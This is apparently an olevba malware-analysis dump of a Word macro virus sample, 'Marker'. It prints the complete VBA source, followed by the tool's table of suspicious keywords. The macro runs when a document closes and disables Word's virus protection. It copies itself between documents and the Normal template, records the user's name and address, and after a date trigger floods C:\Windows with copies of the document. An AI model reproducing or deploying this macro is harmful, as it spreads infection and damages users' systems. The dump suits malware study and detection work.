olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.bn-a55eab0b756c09c7385c04ae1400d474fb7e5e20
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.bn-a55eab0b756c09c7385c04ae1400d474fb7e5e20 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Shane Coursen
' SC
'
' 1/24/2001 10:19:11 AM
'
' Shane Coursen
' SC
'
' 1/24/2001 10:18:58 AM
'
Private Sub Document_Close()
  
  On Error Resume Next
  If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
      Const exi = "la macro de colombia"
      Dim DInfec, planinfec As Boolean
      Dim Docu, Plan As Object
      Dim modulin, contemodu, Ninfec As String
      Dim Nume As Integer
      Dim Copform As Object
   
      Set Docu = ActiveDocument.VBProject.VBComponents.Item(1)
      Set Plan = NormalTemplate.VBProject.VBComponents.Item(1)
      
      SaveDoc = ActiveDocument.Saved
      Saveplan = NormalTemplate.Saved
   
      DInfec = Docu.codemodule.Find(exi, 1, 1, 40000, 40000)
      Plainfec = Plan.codemodule.Find(exi, 1, 1, 40000, 40000)

      Ninfec = "'" & " " & Application.UserName & Chr(13) & "'" & " " & Application.UserInitials & Chr(13) & "'" & " " & Application.UserAddress & Chr(13) & "'" & " " & Now() & Chr(13) & "'" & " "
      
      Options.VirusProtection = False
   
      Nume = Mid(Int(Rnd() * 10), 1, 1)
      Nume = Nume
      nume1 = 7
      If Nume = nume1 Or Plainfec = False Then
         
         If DInfec = True And Plainfec = False Then
            Docu.codemodule.addfromstring Ninfec
            contemodu = Docu.codemodule.Lines(1, Docu.codemodule.CountOfLines)
            Plan.codemodule.addfromstring contemodu
         End If

         If DInfec = False And Plainfec = True Then
            Plan.codemodule.addfromstring Ninfec
            contemodu = Plan.codemodule.Lines(1, Plan.codemodule.CountOfLines)
            Docu.codemodule.addfromstring contemodu
         End If
         
         
      
         If SaveDoc = True Then ThisDocument.Save
         If SaveDoc = True Then NormalTemplate.Save
      End If
  End If
    sd = Day(Now()) & "-" & Month(Now()) & "-" & Year(Now())
  sd = Trim(sd)
  If Year(Now()) >= 2000 And Month(Now()) > 6 Then
    ChangeFileOpenDirectory "C:\Windows\"
    For i = 1 To 999999991
        ActiveDocument.SaveAs FileName:=("AA" & i & "AA.DOC"), FileFormat:= _
        wdFormatDocument, LockComments:=False, Password:="", AddToRecentFiles:= _
        True, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:= _
        False, SaveNativePictureFormat:=False, SaveFormsData:=False, _
        SaveAsAOCELetter:=False
    Next
  End If

End Sub














































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

